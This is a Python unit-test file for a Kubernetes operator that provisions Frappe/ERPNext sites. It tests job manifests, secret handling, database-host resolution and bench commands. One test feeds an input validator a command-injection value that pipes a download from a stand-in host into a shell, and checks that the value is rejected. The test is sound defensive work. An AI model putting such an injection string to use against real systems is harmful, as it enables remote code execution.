# Copyright (c) 2026, Los Favs and Contributors
# See license.txt

from types import SimpleNamespace
from unittest.mock import MagicMock, patch

import frappe
from frappe.tests import UnitTestCase

from kubeport.tasks.site_tasks import (
	BACKUP_MOUNT_PATH,
	BACKUP_PVC_NAME,
	_auto_wire_db_root_secret,
	_backup_storage_path,
	_bench_backup_command,
	_bench_drop_site_command,
	_bench_migrate_command,
	_bench_new_site_command,
	_bench_restore_command,
	_build_creds_secret_manifest,
	_build_drop_creds_secret_manifest,
	_build_drop_env,
	_build_env,
	_build_op_job_manifest,
	_clone_reference_pod_spec,
	_fail_restore_submission,
	_inject_resolved_db_host,
	_job_name,
	_merge_env,
	_parse_install_apps,
	_prepare_backup_ref_spec,
	_resolve_db_root_secret_for_release,
	_safe_label_value,
	can_resolve_db_host_for_release,
)


def _create_manifest(ref_spec, *, force_create=False, install_apps=None, site_name="demo"):
	"""Test helper: assemble a create-site Job manifest the same way the task does."""
	bench_cmd = _bench_new_site_command(site_name, install_apps or [], force_create)
	container_env = _build_env(
		site_name=site_name,
		db_type="mariadb",
		creds_secret_name="ks-demo-aaaabbbbcccc-creds",
		db_root_in_creds=True,
		db_root_secret="",
		db_root_secret_key="",
	)
	return _build_op_job_manifest(
		job_name="ks-demo-abcdef123456",
		namespace="ns",
		site_docname=f"release-a/{site_name}",
		operation_label="create-site",
		container_command=bench_cmd,
		container_env=container_env,
		ref_spec=ref_spec,
	)


class UnitTestSiteHelpers(UnitTestCase):
	def test_job_name_slugifies_and_includes_token_prefix(self):
		name = _job_name("erp.example.com", "deadbeefdeadbeefdeadbeefdeadbeef")
		# '.' → '-', collapsed, prefix, and token[:12]
		self.assertEqual(name, "ks-erp-example-com-deadbeefdead")

	def test_job_name_truncates_long_site_to_40_chars_of_slug(self):
		site = "a" * 80
		name = _job_name(site, "abcdefabcdefabcdefabcdefabcdefab")
		# prefix "ks-" (3) + 40 a's + '-' + 12 hex = 56
		self.assertEqual(name, "ks-" + "a" * 40 + "-abcdefabcdef")

	def test_safe_label_value_strips_slash_and_truncates_to_63(self):
		value = "helm-release/" + "x" * 100
		result = _safe_label_value(value)
		self.assertLessEqual(len(result), 63)
		self.assertNotIn("/", result)
		self.assertFalse(result.endswith("-"))

	def test_parse_install_apps_strips_blank_lines_and_whitespace(self):
		self.assertEqual(
			_parse_install_apps("  erpnext  \n\n  payments  \n"),
			["erpnext", "payments"],
		)

	def test_parse_install_apps_rejects_shell_metacharacters(self):
		with self.assertRaises(ValueError):
			_parse_install_apps('erpnext"; curl evil | sh; #')

	def test_parse_install_apps_rejects_uppercase_and_spaces(self):
		with self.assertRaises(ValueError):
			_parse_install_apps("ERPNext")
		with self.assertRaises(ValueError):
			_parse_install_apps("erp next")

	def test_parse_install_apps_returns_empty_on_none_or_whitespace(self):
		self.assertEqual(_parse_install_apps(None), [])
		self.assertEqual(_parse_install_apps("   \n\n"), [])

	def test_bench_command_appends_force_when_requested(self):
		cmd_forced = _bench_new_site_command("s1", ["erpnext"], force=True)
		cmd_unforced = _bench_new_site_command("s1", ["erpnext"], force=False)
		self.assertIn("--force", cmd_forced)
		self.assertNotIn("--force", cmd_unforced)

	def test_bench_new_site_command_requires_db_host(self):
		cmd = _bench_new_site_command("s1", [], force=False)
		self.assertIn('test -n "$DB_HOST"', cmd)

	def test_bench_command_quotes_install_apps(self):
		cmd = _bench_new_site_command("s1", ["erpnext", "payments"], force=False)
		self.assertIn('--install-app="erpnext"', cmd)
		self.assertIn('--install-app="payments"', cmd)

	def test_bench_new_site_command_uses_mariadb_user_host_login_scope(self):
		cmd = _bench_new_site_command("s1", [], force=False)
		self.assertIn("--mariadb-user-host-login-scope='%'", cmd)
		self.assertNotIn("--no-mariadb-socket", cmd)

	def test_bench_new_site_command_passes_db_host(self):
		cmd = _bench_new_site_command("s1", [], force=False)
		self.assertIn('--db-host="$DB_HOST"', cmd)

	def test_bench_new_site_command_force_preceans_site_dir(self):
		# Frappe's make_site_config never overwrites an existing site_config.json,
		# and ``bench new-site --force`` does not clear it either.  We must reset
		# the site dir ourselves under --force to guarantee retries observe a
		# fresh slate; otherwise a stale partial config silently poisons the run.
		cmd_forced = _bench_new_site_command("s1", [], force=True)
		cmd_unforced = _bench_new_site_command("s1", [], force=False)
		self.assertIn('rm -rf "sites/$SITE_NAME"', cmd_forced)
		# Pre-clean must run before bench so bench sees a clean dir.
		self.assertLess(cmd_forced.index('rm -rf "sites/$SITE_NAME"'), cmd_forced.index("bench"))
		# Without --force we never wipe the dir.
		self.assertNotIn('rm -rf "sites/$SITE_NAME"', cmd_unforced)

	def test_build_env_admin_password_always_references_creds_secret(self):
		env = _build_env(
			site_name="s1",
			db_type="mariadb",
			creds_secret_name="ks-s1-aaaabbbbcccc-creds",
			db_root_in_creds=True,
			db_root_secret="",
			db_root_secret_key="",
		)
		admin = next(e for e in env if e["name"] == "ADMIN_PASSWORD")
		# Security: must not appear as plaintext "value"; must be secretKeyRef.
		self.assertNotIn("value", admin)
		self.assertEqual(
			admin["valueFrom"]["secretKeyRef"],
			{"name": "ks-s1-aaaabbbbcccc-creds", "key": "ADMIN_PASSWORD"},
		)

	def test_build_env_db_root_uses_user_secret_when_provided(self):
		env = _build_env(
			site_name="s1",
			db_type="mariadb",
			creds_secret_name="job-creds",
			db_root_in_creds=False,
			db_root_secret="mariadb-root-secret",
			db_root_secret_key="password",
		)
		db_root_password = next(e for e in env if e["name"] == "DB_ROOT_PASSWORD")
		self.assertNotIn("value", db_root_password)
		self.assertEqual(
			db_root_password["valueFrom"]["secretKeyRef"],
			{"name": "mariadb-root-secret", "key": "password"},
		)

	def test_build_env_db_root_falls_back_to_creds_secret_when_no_user_secret(self):
		env = _build_env(
			site_name="s1",
			db_type="mariadb",
			creds_secret_name="ks-s1-aaaabbbbcccc-creds",
			db_root_in_creds=True,
			db_root_secret="",
			db_root_secret_key="",
		)
		db_root_password = next(e for e in env if e["name"] == "DB_ROOT_PASSWORD")
		self.assertNotIn("value", db_root_password)
		self.assertEqual(
			db_root_password["valueFrom"]["secretKeyRef"],
			{"name": "ks-s1-aaaabbbbcccc-creds", "key": "DB_ROOT_PASSWORD"},
		)

	def test_build_creds_secret_manifest_includes_admin_always(self):
		manifest = _build_creds_secret_manifest(
			secret_name="ks-demo-aaaa-creds",
			namespace="ns",
			site_docname="release/demo",
			admin_password="pw",
			db_root_password=None,
		)
		self.assertEqual(manifest["kind"], "Secret")
		self.assertEqual(manifest["type"], "Opaque")
		self.assertEqual(manifest["stringData"]["ADMIN_PASSWORD"], "pw")
		self.assertNotIn("DB_ROOT_PASSWORD", manifest["stringData"])
		# Carries the managed-by + frappe-site labels so sweeps can find it.
		labels = manifest["metadata"]["labels"]
		self.assertEqual(labels["app.kubernetes.io/managed-by"], "kubeport")

	def test_build_creds_secret_manifest_includes_db_root_when_provided(self):
		manifest = _build_creds_secret_manifest(
			secret_name="ks-demo-aaaa-creds",
			namespace="ns",
			site_docname="release/demo",
			admin_password="pw",
			db_root_password="root-pw",
		)
		self.assertEqual(manifest["stringData"]["DB_ROOT_PASSWORD"], "root-pw")

	def test_merge_env_has_overrides_win_on_name_collision(self):
		base = [
			{"name": "SITE_NAME", "value": "old"},
			{"name": "EXTRA", "value": "keep"},
		]
		overrides = [{"name": "SITE_NAME", "value": "new"}]
		merged = _merge_env(base, overrides)
		site_name = next(e for e in merged if e["name"] == "SITE_NAME")
		self.assertEqual(site_name["value"], "new")
		# base entries with non-conflicting names are preserved
		self.assertTrue(any(e["name"] == "EXTRA" for e in merged))

	def test_inject_resolved_db_host_prefers_reference_env(self):
		env = []
		_inject_resolved_db_host(
			core_v1=MagicMock(),
			namespace="bench-ns",
			release_name="bench-a",
			ref_spec={"container_env": [{"name": "DB_HOST", "value": "bench-a-mariadb"}]},
			container_env=env,
		)

		self.assertEqual(env, [{"name": "DB_HOST", "value": "bench-a-mariadb"}])

	def test_inject_resolved_db_host_reads_common_site_config_configmap(self):
		core_v1 = MagicMock()
		core_v1.read_namespaced_config_map.return_value = SimpleNamespace(
			data={"common_site_config.json": '{"db_host": "bench-a-mariadb"}'}
		)
		env = []

		_inject_resolved_db_host(
			core_v1=core_v1,
			namespace="bench-ns",
			release_name="bench-a",
			ref_spec={
				"container_env": [],
				"volume_mounts": [
					{
						"name": "config",
						"mountPath": "/home/frappe/frappe-bench/sites/common_site_config.json",
					}
				],
				"volumes": [{"name": "config", "configMap": {"name": "bench-a-config"}}],
			},
			container_env=env,
		)

		self.assertEqual(env, [{"name": "DB_HOST", "value": "bench-a-mariadb"}])

	def test_inject_resolved_db_host_falls_back_to_release_owned_mariadb_service(self):
		core_v1 = MagicMock()
		core_v1.list_namespaced_service.return_value = SimpleNamespace(
			items=[
				SimpleNamespace(metadata=SimpleNamespace(name="bench-a-redis", labels=None)),
				SimpleNamespace(metadata=SimpleNamespace(name="bench-a-mariadb", labels=None)),
			]
		)
		env = []

		_inject_resolved_db_host(
			core_v1=core_v1,
			namespace="bench-ns",
			release_name="bench-a",
			ref_spec={"container_env": [], "container_env_from": [], "volume_mounts": [], "volumes": []},
			container_env=env,
		)

		self.assertEqual(env, [{"name": "DB_HOST", "value": "bench-a-mariadb"}])

	def test_inject_resolved_db_host_matches_via_helm_instance_label(self):
		core_v1 = MagicMock()
		core_v1.list_namespaced_service.return_value = SimpleNamespace(
			items=[
				SimpleNamespace(
					metadata=SimpleNamespace(
						name="custom-named-mariadb",
						labels={"app.kubernetes.io/instance": "bench-a"},
					)
				),
			]
		)
		env = []

		_inject_resolved_db_host(
			core_v1=core_v1,
			namespace="bench-ns",
			release_name="bench-a",
			ref_spec={"container_env": [], "container_env_from": [], "volume_mounts": [], "volumes": []},
			container_env=env,
		)

		self.assertEqual(env, [{"name": "DB_HOST", "value": "custom-named-mariadb"}])

	def test_inject_resolved_db_host_ignores_foreign_release_mariadb(self):
		# Regression: a mariadb Service for an unrelated release in the same
		# namespace must NOT be picked up — picking it up would silently
		# route the new-site Job at the wrong DB credentials.
		core_v1 = MagicMock()
		core_v1.list_namespaced_service.return_value = SimpleNamespace(
			items=[
				SimpleNamespace(
					metadata=SimpleNamespace(
						name="wp-prueba-mariadb",
						labels={"app.kubernetes.io/instance": "wp-prueba"},
					)
				),
			]
		)
		env: list[dict] = []

		with self.assertRaises(RuntimeError) as ctx:
			_inject_resolved_db_host(
				core_v1=core_v1,
				namespace="default",
				release_name="bench-a",
				ref_spec={
					"container_env": [],
					"container_env_from": [],
					"volume_mounts": [],
					"volumes": [],
				},
				container_env=env,
				op_kind="create",
			)

		self.assertIn("bench-a", str(ctx.exception))
		self.assertEqual(env, [])

	def test_inject_resolved_db_host_create_op_raises_when_unresolved(self):
		core_v1 = MagicMock()
		core_v1.list_namespaced_service.return_value = SimpleNamespace(items=[])
		env: list[dict] = []

		with self.assertRaises(RuntimeError) as ctx:
			_inject_resolved_db_host(
				core_v1=core_v1,
				namespace="bench-ns",
				release_name="bench-a",
				ref_spec={
					"container_env": [],
					"container_env_from": [],
					"volume_mounts": [],
					"volumes": [],
				},
				container_env=env,
				op_kind="create",
			)

		self.assertIn("bench-a", str(ctx.exception))
		self.assertIn("dbHost", str(ctx.exception))
		self.assertEqual(env, [])

	def test_resolve_db_root_secret_returns_release_owned_secret(self):
		core_v1 = MagicMock()
		core_v1.list_namespaced_secret.return_value = SimpleNamespace(
			items=[
				SimpleNamespace(
					metadata=SimpleNamespace(name="bench-a-mariadb", labels=None),
					data={"mariadb-root-password": "abc"},
				),
			]
		)
		secret_name, secret_key = _resolve_db_root_secret_for_release(core_v1, "bench-ns", "bench-a")
		self.assertEqual((secret_name, secret_key), ("bench-a-mariadb", "mariadb-root-password"))

	def test_resolve_db_root_secret_matches_via_helm_instance_label(self):
		core_v1 = MagicMock()
		core_v1.list_namespaced_secret.return_value = SimpleNamespace(
			items=[
				SimpleNamespace(
					metadata=SimpleNamespace(
						name="custom-mariadb-secret",
						labels={"app.kubernetes.io/instance": "bench-a"},
					),
					data={"mariadb-root-password": "abc"},
				),
			]
		)
		secret_name, secret_key = _resolve_db_root_secret_for_release(core_v1, "bench-ns", "bench-a")
		self.assertEqual((secret_name, secret_key), ("custom-mariadb-secret", "mariadb-root-password"))

	def test_resolve_db_root_secret_ignores_foreign_release_secrets(self):
		core_v1 = MagicMock()
		core_v1.list_namespaced_secret.return_value = SimpleNamespace(
			items=[
				SimpleNamespace(
					metadata=SimpleNamespace(
						name="wp-prueba-mariadb",
						labels={"app.kubernetes.io/instance": "wp-prueba"},
					),
					data={"mariadb-root-password": "abc"},
				),
			]
		)
		secret_name, secret_key = _resolve_db_root_secret_for_release(core_v1, "default", "bench-a")
		self.assertEqual((secret_name, secret_key), ("", ""))

	def test_resolve_db_root_secret_returns_empty_when_expected_key_missing(self):
		core_v1 = MagicMock()
		core_v1.list_namespaced_secret.return_value = SimpleNamespace(
			items=[
				SimpleNamespace(
					metadata=SimpleNamespace(name="bench-a-mariadb", labels=None),
					data={"unrelated-key": "abc"},
				),
			]
		)
		secret_name, secret_key = _resolve_db_root_secret_for_release(core_v1, "bench-ns", "bench-a")
		self.assertEqual((secret_name, secret_key), ("", ""))

	def test_auto_wire_db_root_secret_populates_doc_when_empty(self):
		doc = MagicMock()
		doc.db_root_secret = ""
		core_v1 = MagicMock()
		core_v1.list_namespaced_secret.return_value = SimpleNamespace(
			items=[
				SimpleNamespace(
					metadata=SimpleNamespace(name="bench-a-mariadb", labels=None),
					data={"mariadb-root-password": "abc"},
				),
			]
		)
		_auto_wire_db_root_secret(core_v1=core_v1, doc=doc, namespace="bench-ns", release_name="bench-a")
		self.assertEqual(doc.db_root_secret, "bench-a-mariadb")
		self.assertEqual(doc.db_root_secret_key, "mariadb-root-password")
		# Persistence happens via db_set so a worker reload sees the value.
		set_calls = {call.args[0] for call in doc.db_set.call_args_list}
		self.assertIn("db_root_secret", set_calls)
		self.assertIn("db_root_secret_key", set_calls)

	def test_auto_wire_db_root_secret_no_op_when_doc_already_has_secret(self):
		doc = MagicMock()
		doc.db_root_secret = "operator-supplied-secret"
		core_v1 = MagicMock()
		_auto_wire_db_root_secret(core_v1=core_v1, doc=doc, namespace="bench-ns", release_name="bench-a")
		# Operator's choice wins; we don't even query the cluster.
		self.assertEqual(doc.db_root_secret, "operator-supplied-secret")
		core_v1.list_namespaced_secret.assert_not_called()
		doc.db_set.assert_not_called()

	def test_auto_wire_db_root_secret_no_op_when_no_release_owned_secret(self):
		doc = MagicMock()
		doc.db_root_secret = ""
		core_v1 = MagicMock()
		core_v1.list_namespaced_secret.return_value = SimpleNamespace(items=[])
		_auto_wire_db_root_secret(core_v1=core_v1, doc=doc, namespace="bench-ns", release_name="bench-a")
		self.assertEqual(doc.db_root_secret, "")
		doc.db_set.assert_not_called()

	@patch("kubeport.tasks.site_tasks.client")
	@patch("kubeport.tasks.site_tasks.get_k8s_api_client")
	def test_can_resolve_db_host_for_release_true_when_release_owned_service_exists(
		self, mock_get_client, mock_client_module
	):
		mock_get_client.return_value = MagicMock()
		core_v1 = MagicMock()
		core_v1.list_namespaced_service.return_value = SimpleNamespace(
			items=[
				SimpleNamespace(metadata=SimpleNamespace(name="bench-a-mariadb", labels=None)),
			]
		)
		mock_client_module.CoreV1Api.return_value = core_v1
		self.assertTrue(can_resolve_db_host_for_release("cluster-a", "bench-ns", "bench-a"))

	@patch("kubeport.tasks.site_tasks.client")
	@patch("kubeport.tasks.site_tasks.get_k8s_api_client")
	def test_can_resolve_db_host_for_release_false_when_only_foreign_mariadb(
		self, mock_get_client, mock_client_module
	):
		mock_get_client.return_value = MagicMock()
		core_v1 = MagicMock()
		core_v1.list_namespaced_service.return_value = SimpleNamespace(
			items=[
				SimpleNamespace(
					metadata=SimpleNamespace(
						name="wp-prueba-mariadb",
						labels={"app.kubernetes.io/instance": "wp-prueba"},
					)
				),
			]
		)
		mock_client_module.CoreV1Api.return_value = core_v1
		self.assertFalse(can_resolve_db_host_for_release("cluster-a", "default", "bench-a"))

	@patch("kubeport.tasks.site_tasks.get_k8s_api_client", side_effect=RuntimeError("boom"))
	def test_can_resolve_db_host_for_release_returns_true_on_client_build_failure(self, _mock_get_client):
		# Transient K8s client-build failure must not block the click — the
		# worker will surface a clearer cluster-side error.
		self.assertTrue(can_resolve_db_host_for_release("cluster-a", "ns", "rel-a"))

	def test_inject_resolved_db_host_non_create_ops_tolerate_unresolved(self):
		# Migrate / drop fall back to site_config.json on the bench PVC, so a
		# resolution miss must not block them.
		core_v1 = MagicMock()
		core_v1.list_namespaced_service.return_value = SimpleNamespace(items=[])
		env: list[dict] = []

		for op_kind in ("migrate", "delete", ""):
			_inject_resolved_db_host(
				core_v1=core_v1,
				namespace="bench-ns",
				release_name="bench-a",
				ref_spec={
					"container_env": [],
					"container_env_from": [],
					"volume_mounts": [],
					"volumes": [],
				},
				container_env=env,
				op_kind=op_kind,
			)
		self.assertEqual(env, [])


class UnitTestClonePodSpec(UnitTestCase):
	def _ref_pod(self, include_sites_mount: bool = True) -> SimpleNamespace:
		sites_mount = SimpleNamespace(
			name="sites-volume",
			mount_path="/home/frappe/frappe-bench/sites",
		)
		config_mount = SimpleNamespace(
			name="config-volume",
			mount_path="/home/frappe/frappe-bench/sites/common_site_config.json",
		)
		container = SimpleNamespace(
			name="frappe",
			image="frappe/erpnext:v15.0.0",
			volume_mounts=[sites_mount, config_mount] if include_sites_mount else [config_mount],
			env=[{"name": "DB_HOST", "value": "mariadb"}],
			env_from=[{"configMapRef": {"name": "frappe-config"}}],
			resources={"requests": {"cpu": "100m"}},
			security_context={"runAsUser": 1000},
		)
		sites_volume = SimpleNamespace(
			name="sites-volume",
			persistent_volume_claim={"claimName": "sites-pvc"},
		)
		unused_volume = SimpleNamespace(
			name="not-referenced",
			empty_dir={},
		)
		spec = SimpleNamespace(
			containers=[container],
			volumes=[sites_volume, unused_volume],
			service_account_name="frappe-sa",
			image_pull_secrets=[{"name": "registry-secret"}],
			security_context={"fsGroup": 1000},
			node_selector={"role": "frappe"},
			tolerations=[{"key": "dedicated", "operator": "Equal", "value": "frappe"}],
			affinity=None,
			priority_class_name="high",
			runtime_class_name=None,
		)
		return SimpleNamespace(spec=spec)

	def _fake_api_client(self) -> MagicMock:
		api_client = MagicMock()

		# sanitize_for_serialization returns a list/dict of plain dicts in the test helpers
		def _sanitize(value):
			if value is None:
				return None
			if isinstance(value, list):
				return [_sanitize(v) for v in value]
			if isinstance(value, dict):
				return value
			if isinstance(value, SimpleNamespace):
				return {
					k.replace("_", ""): _sanitize(v) if not isinstance(v, (str, int, dict)) else v
					for k, v in vars(value).items()
					if v is not None
				}
			return value

		def _sanitize_vm(vm):
			return {"name": vm.name, "mountPath": vm.mount_path}

		def _sanitize_vol(v):
			return {"name": v.name}

		def sanitize(value):
			if isinstance(value, list) and value and isinstance(value[0], SimpleNamespace):
				first = value[0]
				if hasattr(first, "mount_path"):
					return [_sanitize_vm(vm) for vm in value]
				if hasattr(first, "persistent_volume_claim") or hasattr(first, "empty_dir"):
					return [_sanitize_vol(v) for v in value]
			return value

		api_client.sanitize_for_serialization.side_effect = sanitize
		return api_client

	def test_clone_lifts_whitelisted_pod_level_fields(self):
		ref = _clone_reference_pod_spec(self._fake_api_client(), self._ref_pod())
		pod_level = ref["pod_level"]
		self.assertEqual(pod_level["serviceAccountName"], "frappe-sa")
		self.assertEqual(pod_level["imagePullSecrets"], [{"name": "registry-secret"}])
		self.assertEqual(pod_level["securityContext"], {"fsGroup": 1000})
		self.assertEqual(pod_level["nodeSelector"], {"role": "frappe"})
		self.assertEqual(pod_level["priorityClassName"], "high")
		# None/empty fields are filtered out
		self.assertNotIn("affinity", pod_level)
		self.assertNotIn("runtimeClassName", pod_level)

	def test_clone_includes_container_env_env_from_resources_security_context(self):
		ref = _clone_reference_pod_spec(self._fake_api_client(), self._ref_pod())
		self.assertEqual(ref["container_env"], [{"name": "DB_HOST", "value": "mariadb"}])
		self.assertEqual(
			ref["container_env_from"],
			[{"configMapRef": {"name": "frappe-config"}}],
		)
		self.assertEqual(ref["container_resources"], {"requests": {"cpu": "100m"}})
		self.assertEqual(ref["container_security_context"], {"runAsUser": 1000})

	def test_clone_filters_volumes_to_those_the_container_references(self):
		ref = _clone_reference_pod_spec(self._fake_api_client(), self._ref_pod())
		vol_names = {v["name"] for v in ref["volumes"]}
		# sites-volume and config-volume are referenced; not-referenced is not
		self.assertIn("sites-volume", vol_names)
		self.assertNotIn("not-referenced", vol_names)

	def test_clone_raises_when_sites_mount_is_missing(self):
		with self.assertRaises(RuntimeError):
			_clone_reference_pod_spec(self._fake_api_client(), self._ref_pod(False))


class UnitTestJobManifest(UnitTestCase):
	def _ref_spec(self) -> dict:
		return {
			"image": "frappe/erpnext:v15.0.0",
			"pod_level": {
				"serviceAccountName": "frappe-sa",
				"imagePullSecrets": [{"name": "registry-secret"}],
				"securityContext": {"fsGroup": 1000},
			},
			"container_env": [{"name": "DB_HOST", "value": "mariadb"}],
			"container_env_from": [{"configMapRef": {"name": "frappe-config"}}],
			"container_resources": {"requests": {"cpu": "100m"}},
			"container_security_context": {"runAsUser": 1000},
			"volume_mounts": [{"name": "sites", "mountPath": "/home/frappe/frappe-bench/sites"}],
			"volumes": [{"name": "sites", "persistentVolumeClaim": {"claimName": "sites-pvc"}}],
		}

	def test_manifest_lifts_pod_level_fields(self):
		manifest = _create_manifest(self._ref_spec(), install_apps=["erpnext"])
		pod = manifest["spec"]["template"]["spec"]
		self.assertEqual(pod["serviceAccountName"], "frappe-sa")
		self.assertEqual(pod["imagePullSecrets"], [{"name": "registry-secret"}])
		self.assertEqual(pod["securityContext"], {"fsGroup": 1000})

	def test_manifest_container_includes_env_from_and_resources(self):
		manifest = _create_manifest(self._ref_spec())
		container = manifest["spec"]["template"]["spec"]["containers"][0]
		self.assertEqual(container["envFrom"], [{"configMapRef": {"name": "frappe-config"}}])
		self.assertEqual(container["resources"], {"requests": {"cpu": "100m"}})
		self.assertEqual(container["securityContext"], {"runAsUser": 1000})

	def test_manifest_sets_active_deadline_seconds(self):
		"""The Job must carry an activeDeadlineSeconds ceiling so a stuck pod
		eventually flips to failed — without it, reconciliation's succeeded/
		failed polling never fires on hangs and the row sits In Progress forever.
		"""
		from kubeport.tasks.site_tasks import _JOB_ACTIVE_DEADLINE_SECONDS

		manifest = _create_manifest(self._ref_spec())
		self.assertEqual(
			manifest["spec"]["activeDeadlineSeconds"],
			_JOB_ACTIVE_DEADLINE_SECONDS,
		)
		# Must be a positive int (K8s rejects 0 and negatives).
		self.assertIsInstance(manifest["spec"]["activeDeadlineSeconds"], int)
		self.assertGreater(manifest["spec"]["activeDeadlineSeconds"], 0)

	def test_manifest_passes_force_flag_through_to_bench_command(self):
		"""force_create on the DocType must reach the bench argv as --force.
		Regression guard for the broken Recreate path where the controller used
		to reject Active unconditionally, hiding this end-to-end wiring.
		"""
		manifest = _create_manifest(self._ref_spec(), force_create=True)
		bench_cmd = manifest["spec"]["template"]["spec"]["containers"][0]["args"][0]
		self.assertIn("--force", bench_cmd)

	def test_manifest_site_env_wins_over_bench_env(self):
		ref = self._ref_spec()
		ref["container_env"] = [{"name": "SITE_NAME", "value": "WRONG"}]
		manifest = _create_manifest(ref)
		env = manifest["spec"]["template"]["spec"]["containers"][0]["env"]
		site_name_entries = [e for e in env if e["name"] == "SITE_NAME"]
		self.assertEqual(len(site_name_entries), 1)
		self.assertEqual(site_name_entries[0]["value"], "demo")

	def test_manifest_uses_operation_label_as_container_name(self):
		"""The operation_label arg controls the container name so logs and
		pod inspection clearly identify which lifecycle op a Job represents.
		"""
		manifest = _build_op_job_manifest(
			job_name="ks-demo-abcdef123456",
			namespace="ns",
			site_docname="release-a/demo",
			operation_label="delete-site",
			container_command="echo noop",
			container_env=[],
			ref_spec=self._ref_spec(),
		)
		container = manifest["spec"]["template"]["spec"]["containers"][0]
		self.assertEqual(container["name"], "delete-site")

	def test_drop_site_command_quotes_env_vars(self):
		"""Drop-site command must reference shell-quoted env vars so a malformed
		site_name (or DB password) cannot break out of the argv.
		"""
		cmd = _bench_drop_site_command("demo")
		self.assertIn('"$SITE_NAME"', cmd)
		self.assertIn('--root-login="$DB_ROOT_USER"', cmd)
		self.assertIn('--root-password="$DB_ROOT_PASSWORD"', cmd)
		self.assertIn("--no-backup", cmd)
		self.assertIn("--force", cmd)
		# Site name is never interpolated as plaintext into the command.
		self.assertNotIn("demo", cmd.replace('"$SITE_NAME"', ""))

	def test_drop_site_command_does_not_set_admin_password(self):
		"""Drop-site does not need an admin password — it should not reference
		ADMIN_PASSWORD anywhere in the command.
		"""
		cmd = _bench_drop_site_command("demo")
		self.assertNotIn("ADMIN_PASSWORD", cmd)
		self.assertNotIn("admin-password", cmd)

	def test_migrate_command_uses_site_env_var(self):
		"""Migrate command must use $SITE_NAME (validated, env-injected) and
		not interpolate the raw site name into the shell string.
		"""
		cmd = _bench_migrate_command("demo")
		self.assertEqual(cmd, 'bench --site "$SITE_NAME" migrate')
		self.assertNotIn("demo", cmd)

	def test_backup_command_creates_archive_and_metadata_markers(self):
		cmd = _bench_backup_command()
		self.assertIn('bench --site "$SITE_NAME" backup --with-files', cmd)
		self.assertIn('tar -C "$backup_dir" -czf "$BACKUP_ARCHIVE_PATH"', cmd)
		self.assertIn("KUBEPORT_BACKUP_SIZE", cmd)

	def test_restore_command_uses_archive_and_force_restore(self):
		cmd = _bench_restore_command()
		self.assertIn('tar -xzf "$BACKUP_ARCHIVE_PATH"', cmd)
		self.assertIn('bench --site "$SITE_NAME" restore "$db_file" --force', cmd)
		self.assertIn("--with-private-files", cmd)

	def test_backup_storage_path_is_inside_backup_mount(self):
		path = _backup_storage_path("cluster/a", "bench ns", "demo.example.com", "demo.20260430")
		self.assertTrue(path.startswith(BACKUP_MOUNT_PATH + "/"))
		self.assertNotIn(" ", path)
		self.assertNotIn("//", path)

	def test_build_drop_env_omits_admin_password(self):
		"""Drop-site env must not carry ADMIN_PASSWORD — it is a no-op for
		drop-site and would expose a credential the Job does not need.
		"""
		env = _build_drop_env(
			site_name="demo",
			db_type="mariadb",
			creds_secret_name="ks-demo-aaaabbbbcccc-creds",
			db_root_in_creds=True,
			db_root_secret="",
			db_root_secret_key="",
		)
		names = {e["name"] for e in env}
		self.assertNotIn("ADMIN_PASSWORD", names)
		self.assertEqual(names, {"SITE_NAME", "DB_TYPE", "DB_ROOT_USER", "DB_ROOT_PASSWORD"})

	def test_build_drop_env_uses_user_secret_when_provided(self):
		env = _build_drop_env(
			site_name="demo",
			db_type="mariadb",
			creds_secret_name=None,
			db_root_in_creds=False,
			db_root_secret="user-mariadb-secret",
			db_root_secret_key="root-pw",
		)
		db_root = next(e for e in env if e["name"] == "DB_ROOT_PASSWORD")
		self.assertEqual(
			db_root["valueFrom"]["secretKeyRef"],
			{"name": "user-mariadb-secret", "key": "root-pw"},
		)

	def test_build_drop_creds_secret_carries_only_db_root(self):
		manifest = _build_drop_creds_secret_manifest(
			secret_name="ks-demo-aaaabbbbcccc-creds",
			namespace="ns",
			site_docname="release-a/demo",
			db_root_password="hunter2",
		)
		self.assertEqual(manifest["stringData"], {"DB_ROOT_PASSWORD": "hunter2"})
		labels = manifest["metadata"]["labels"]
		self.assertIn("kubeport.io/frappe-site", labels)
		self.assertIn("app.kubernetes.io/managed-by", labels)

	@patch("kubeport.tasks.site_tasks.client.CoreV1Api")
	@patch("kubeport.tasks.site_tasks.apply_resource")
	@patch("kubeport.tasks.site_tasks.frappe.get_doc")
	def test_prepare_backup_ref_spec_applies_rwx_pvc_and_mounts_it(
		self,
		mock_get_doc,
		mock_apply_resource,
		mock_core_v1,
	):
		from kubernetes.client.rest import ApiException

		api_client = MagicMock()
		mock_get_doc.return_value = SimpleNamespace(
			backup_storage_class="fast-rwx",
			backup_access_mode="ReadWriteMany",
		)
		mock_core_v1.return_value.read_namespaced_persistent_volume_claim.side_effect = ApiException(
			status=404,
		)
		ref_spec = {"volumes": [], "volume_mounts": []}

		_prepare_backup_ref_spec(
			doc=SimpleNamespace(),
			release=SimpleNamespace(cluster="cluster-a"),
			namespace="ns",
			api_client=api_client,
			ref_spec=ref_spec,
		)

		manifest = mock_apply_resource.call_args.args[1]
		self.assertEqual(manifest["metadata"]["name"], BACKUP_PVC_NAME)
		self.assertEqual(manifest["spec"]["accessModes"], ["ReadWriteMany"])
		self.assertEqual(manifest["spec"]["storageClassName"], "fast-rwx")
		self.assertEqual(ref_spec["volumes"][0]["persistentVolumeClaim"]["claimName"], BACKUP_PVC_NAME)
		self.assertEqual(ref_spec["volume_mounts"][0]["mountPath"], BACKUP_MOUNT_PATH)

	@patch("kubeport.tasks.site_tasks.client.CoreV1Api")
	@patch("kubeport.tasks.site_tasks.apply_resource")
	@patch("kubeport.tasks.site_tasks.frappe.get_doc")
	def test_prepare_backup_ref_spec_honours_rwo_access_mode(
		self,
		mock_get_doc,
		mock_apply_resource,
		mock_core_v1,
	):
		from kubernetes.client.rest import ApiException

		api_client = MagicMock()
		mock_get_doc.return_value = SimpleNamespace(
			backup_storage_class=None,
			backup_access_mode="ReadWriteOnce",
		)
		mock_core_v1.return_value.read_namespaced_persistent_volume_claim.side_effect = ApiException(
			status=404,
		)
		ref_spec = {"volumes": [], "volume_mounts": []}

		_prepare_backup_ref_spec(
			doc=SimpleNamespace(),
			release=SimpleNamespace(cluster="cluster-a"),
			namespace="ns",
			api_client=api_client,
			ref_spec=ref_spec,
		)

		manifest = mock_apply_resource.call_args.args[1]
		self.assertEqual(manifest["spec"]["accessModes"], ["ReadWriteOnce"])
		self.assertNotIn("storageClassName", manifest["spec"])

	@patch("kubeport.tasks.site_tasks.client.CoreV1Api")
	@patch("kubeport.tasks.site_tasks.apply_resource")
